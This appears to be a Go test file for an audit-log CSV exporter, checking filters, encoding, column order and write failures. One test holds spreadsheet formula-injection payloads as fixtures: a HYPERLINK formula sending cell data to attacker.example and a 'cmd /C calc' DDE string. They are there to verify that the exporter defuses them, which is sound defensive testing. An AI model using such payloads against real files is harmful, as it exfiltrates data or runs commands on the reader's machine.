package audit

import (
	"bytes"
	"encoding/csv"
	"errors"
	"io"
	"strings"
	"testing"
	"time"
)

func TestABackwardsRangeIsRefusedRatherThanSwapped(t *testing.T) {
	start := time.Date(2026, 8, 1, 0, 0, 0, 0, time.UTC)

	for name, filter := range map[string]Filter{
		"end before start": {Since: start, Until: start.Add(-time.Hour)},
		"end equals start": {Since: start, Until: start},
	} {
		t.Run(name, func(t *testing.T) {
			if _, err := filter.Normalise(); !errors.Is(err, ErrBackwardsRange) {
				// Swapping would return rows nobody asked for and ignoring
				// would return every row there is. Both look like they worked,
				// which in an export is the difference between a month of
				// decisions and all of them.
				t.Fatalf("want ErrBackwardsRange, got %v", err)
			}
		})
	}
}

func TestAnOpenEndedRangeIsAllowed(t *testing.T) {
	// "Everything since January" and "everything up to March" are both real
	// questions, so only a range with both ends set can be backwards.
	start := time.Date(2026, 8, 1, 0, 0, 0, 0, time.UTC)

	if _, err := (Filter{Since: start}).Normalise(); err != nil {
		t.Fatalf("open-ended upper bound: %v", err)
	}
	if _, err := (Filter{Until: start}).Normalise(); err != nil {
		t.Fatalf("open-ended lower bound: %v", err)
	}
	if _, err := (Filter{}).Normalise(); err != nil {
		t.Fatalf("no range at all: %v", err)
	}
}

func TestAnEmptyActionTypeIsDroppedRatherThanMatchingNothing(t *testing.T) {
	// An empty string in the array reaches the query as a value that matches no
	// row, so a client sending one would silently get an empty page rather than
	// the unfiltered list it meant to ask for.
	filter, err := Filter{
		ActionTypes:  []string{"approve_finding", "", "  ", "approve_finding", " reject_finding "},
		ActorUserIDs: []string{"", "u1", "u1"},
	}.Normalise()
	if err != nil {
		t.Fatalf("normalise: %v", err)
	}

	if got, want := strings.Join(filter.ActionTypes, ","), "approve_finding,reject_finding"; got != want {
		t.Fatalf("action types: got %q, want %q", got, want)
	}
	if got, want := strings.Join(filter.ActorUserIDs, ","), "u1"; got != want {
		t.Fatalf("actor ids: got %q, want %q", got, want)
	}
}

func TestAFilterOfNothingStaysNilRatherThanBecomingAnEmptyArray(t *testing.T) {
	// The store reads nil as "no predicate". An empty non-nil slice would reach
	// `= any('{}')`, which matches no row, so a request with no filter at all
	// would return nothing.
	filter, err := Filter{ActionTypes: []string{"", "   "}}.Normalise()
	if err != nil {
		t.Fatalf("normalise: %v", err)
	}
	if filter.ActionTypes != nil {
		t.Fatalf("want nil, got %#v", filter.ActionTypes)
	}
}

func TestClampPageSize(t *testing.T) {
	for name, tc := range map[string]struct{ in, want int }{
		"zero means the default":     {0, DefaultPageSize},
		"negative means the default": {-10, DefaultPageSize},
		"a sane size is kept":        {25, 25},
		"the ceiling holds":          {10000, MaxPageSize},
		"exactly the ceiling":        {MaxPageSize, MaxPageSize},
	} {
		t.Run(name, func(t *testing.T) {
			if got := ClampPageSize(tc.in); got != tc.want {
				t.Fatalf("got %d, want %d", got, tc.want)
			}
		})
	}
}

func TestTheExportOpensCorrectlyInASpreadsheet(t *testing.T) {
	var buf bytes.Buffer
	at := time.Date(2026, 8, 17, 14, 32, 5, 0, time.FixedZone("CEST", 2*3600))

	err := WriteCSV(&buf, []Entry{{
		ID:         "a1",
		OccurredAt: at,
		ActionType: "approve_finding",
		Actor: Actor{
			UserID: "u1", DisplayName: "Håkan Öberg",
			Email: "hakan@example.com", Role: "owner", Kind: ActorHuman,
		},
		FindingID:   "f1",
		TargetTable: "processing_activities",
		TargetID:    "p1",
		BeforeJSON:  `{"status":"pending"}`,
		AfterJSON:   `{"status":"approved"}`,
	}})
	if err != nil {
		t.Fatalf("WriteCSV: %v", err)
	}

	raw := buf.Bytes()

	// Without the BOM, Excel on Windows reads UTF-8 as the local code page and
	// mangles exactly the names this file exists to record.
	if !bytes.HasPrefix(raw, []byte{0xEF, 0xBB, 0xBF}) {
		t.Fatal("no UTF-8 byte order mark")
	}

	rows, err := csv.NewReader(bytes.NewReader(raw[3:])).ReadAll()
	if err != nil {
		t.Fatalf("the file is not valid CSV: %v", err)
	}
	if len(rows) != 2 {
		t.Fatalf("want a header and one row, got %d rows", len(rows))
	}

	header, row := rows[0], rows[1]
	if len(row) != len(csvHeader) {
		t.Fatalf("row has %d columns, header has %d", len(row), len(csvHeader))
	}

	field := func(name string) string {
		for i, column := range header {
			if column == name {
				return row[i]
			}
		}
		t.Fatalf("no %q column", name)
		return ""
	}

	// UTC with an offset, not the viewer's wall clock. This file is read in
	// other timezones and possibly years later, and "14:32" is unverifiable.
	if got, want := field("occurred_at"), "2026-08-17T12:32:05Z"; got != want {
		t.Fatalf("occurred_at: got %q, want %q", got, want)
	}
	if got := field("actor_name"); got != "Håkan Öberg" {
		t.Fatalf("actor_name: got %q", got)
	}
	// The role AS RECORDED. A page resolving it now would relabel past acts
	// every time somebody's role changed.
	if got := field("actor_role"); got != "owner" {
		t.Fatalf("actor_role: got %q", got)
	}
	// In full rather than summarised: a record somebody can check a claim
	// against, not an event list.
	if got := field("before"); got != `{"status":"pending"}` {
		t.Fatalf("before: got %q", got)
	}
}

func TestAnActorWhoHasLeftStillAppears(t *testing.T) {
	// An audit log that dropped rows when somebody was offboarded would be
	// defeatable by offboarding somebody. The name is gone; the row is not.
	var buf bytes.Buffer
	err := WriteCSV(&buf, []Entry{{
		ID:         "a1",
		OccurredAt: time.Unix(0, 0).UTC(),
		ActionType: "reject_finding",
		Actor:      Actor{UserID: "u-gone", Role: "admin", Kind: ActorHuman},
	}})
	if err != nil {
		t.Fatalf("WriteCSV: %v", err)
	}

	rows, err := csv.NewReader(bytes.NewReader(buf.Bytes()[3:])).ReadAll()
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	if len(rows) != 2 {
		t.Fatalf("the row was dropped: %d rows", len(rows))
	}
	if !strings.Contains(strings.Join(rows[1], ","), "u-gone") {
		t.Fatalf("the user id is gone too: %v", rows[1])
	}
}

func TestAFieldThatLooksLikeCsvSyntaxDoesNotBreakTheFile(t *testing.T) {
	// `before` and `after` are JSON holding whatever a row contained, which is
	// user-controlled text. A quote or a newline in a display name must not be
	// able to shift every following column, because the person reading the
	// result is auditing it.
	var buf bytes.Buffer
	err := WriteCSV(&buf, []Entry{{
		ID:         "a1",
		OccurredAt: time.Unix(0, 0).UTC(),
		ActionType: "approve_finding",
		Actor:      Actor{UserID: "u1", DisplayName: "O\"Brien,\nInc", Role: "owner"},
		AfterJSON:  "{\"note\":\"line one\r\nline two, \\\"quoted\\\"\"}",
	}})
	if err != nil {
		t.Fatalf("WriteCSV: %v", err)
	}

	rows, err := csv.NewReader(bytes.NewReader(buf.Bytes()[3:])).ReadAll()
	if err != nil {
		t.Fatalf("the file is not valid CSV: %v", err)
	}
	if len(rows) != 2 {
		t.Fatalf("the embedded newline split the row: got %d rows", len(rows))
	}
	if len(rows[1]) != len(csvHeader) {
		t.Fatalf("column count shifted: got %d, want %d", len(rows[1]), len(csvHeader))
	}
	if rows[1][3] != "O\"Brien,\nInc" {
		t.Fatalf("the name did not round-trip: %q", rows[1][3])
	}
}

func TestASpreadsheetFormulaInANameIsDefused(t *testing.T) {
	// The person who opens this file is an auditor, on a corporate laptop,
	// reviewing a record they have been told is trustworthy. A member who names
	// themselves with a leading `=` should not get code execution out of that.
	var buf bytes.Buffer
	err := WriteCSV(&buf, []Entry{{
		ID:         "a1",
		OccurredAt: time.Unix(0, 0).UTC(),
		ActionType: "approve_finding",
		Actor: Actor{
			UserID:      "u1",
			DisplayName: `=HYPERLINK("https://attacker.example/"&A1,"click")`,
			Role:        "owner",
		},
		AfterJSON: "@SUM(1+1)*cmd|' /C calc'!A0",
	}})
	if err != nil {
		t.Fatalf("WriteCSV: %v", err)
	}

	rows, err := csv.NewReader(bytes.NewReader(buf.Bytes()[3:])).ReadAll()
	if err != nil {
		t.Fatalf("parse: %v", err)
	}

	for _, cell := range rows[1] {
		if cell == "" {
			continue
		}
		if strings.ContainsRune("=+-@\t\r", rune(cell[0])) {
			t.Fatalf("a cell still opens with a formula character: %q", cell)
		}
	}

	// Defused, not dropped. The value is still readable, which matters because
	// this is the record of what somebody was actually called.
	if !strings.Contains(rows[1][3], "HYPERLINK") {
		t.Fatalf("the name was lost rather than neutralised: %q", rows[1][3])
	}
}

func TestNeutraliseLeavesOrdinaryTextAlone(t *testing.T) {
	// A mitigation that rewrote every cell would make the file harder to parse
	// for no gain, and would put an apostrophe in front of every uuid.
	for _, in := range []string{"approve_finding", "Håkan Öberg", `{"a":1}`, "u1", ""} {
		if got := neutralise(in); got != in {
			t.Fatalf("%q was rewritten to %q", in, got)
		}
	}
}

func TestAnEmptyExportIsStillAValidFileWithItsHeader(t *testing.T) {
	// A zero-row export is a real answer: nobody decided anything in that
	// window. A completely empty file reads as a broken download.
	var buf bytes.Buffer
	if err := WriteCSV(&buf, nil); err != nil {
		t.Fatalf("WriteCSV: %v", err)
	}

	rows, err := csv.NewReader(bytes.NewReader(buf.Bytes()[3:])).ReadAll()
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	if len(rows) != 1 {
		t.Fatalf("want just a header, got %d rows", len(rows))
	}
	if rows[0][0] != "occurred_at" {
		t.Fatalf("header: %v", rows[0])
	}
}

func TestTheColumnOrderIsPinnedBecauseSomebodyWillBuildOnIt(t *testing.T) {
	// Somebody will point a spreadsheet at column C. Reordering or renaming
	// later breaks work that is not in this repository, so this test exists to
	// make that a deliberate decision rather than a refactor. Append, do not
	// rearrange.
	want := "occurred_at,action_type,actor_user_id,actor_name,actor_email," +
		"actor_role,finding_id,target_table,target_id,before,after," +
		"agent_run_id,audit_id"
	if got := strings.Join(csvHeader, ","); got != want {
		t.Fatalf("the export's columns changed:\n got %s\nwant %s", got, want)
	}
}

func TestExportFilenameIsDated(t *testing.T) {
	at := time.Date(2026, 8, 17, 23, 30, 0, 0, time.FixedZone("NZST", 12*3600))
	// UTC, so two people in different offices exporting the same moment get the
	// same filename.
	if got, want := ExportFilename(at), "kindlast-audit-2026-08-17.csv"; got != want {
		t.Fatalf("got %q, want %q", got, want)
	}
}

type failingWriter struct{ afterBytes int }

func (f *failingWriter) Write(p []byte) (int, error) {
	if f.afterBytes <= 0 {
		return 0, io.ErrClosedPipe
	}
	if len(p) > f.afterBytes {
		n := f.afterBytes
		f.afterBytes = 0
		return n, io.ErrClosedPipe
	}
	f.afterBytes -= len(p)
	return len(p), nil
}

func TestAWriteFailureIsReportedRatherThanProducingAShortFile(t *testing.T) {
	// A truncated download that returns no error is the worst outcome this
	// package has: the caller believes it has the record.
	err := WriteCSV(&failingWriter{afterBytes: 4}, []Entry{{
		ID: "a1", OccurredAt: time.Unix(0, 0).UTC(), ActionType: "approve_finding",
	}})
	if err == nil {
		t.Fatal("a failed write was reported as success")
	}
}
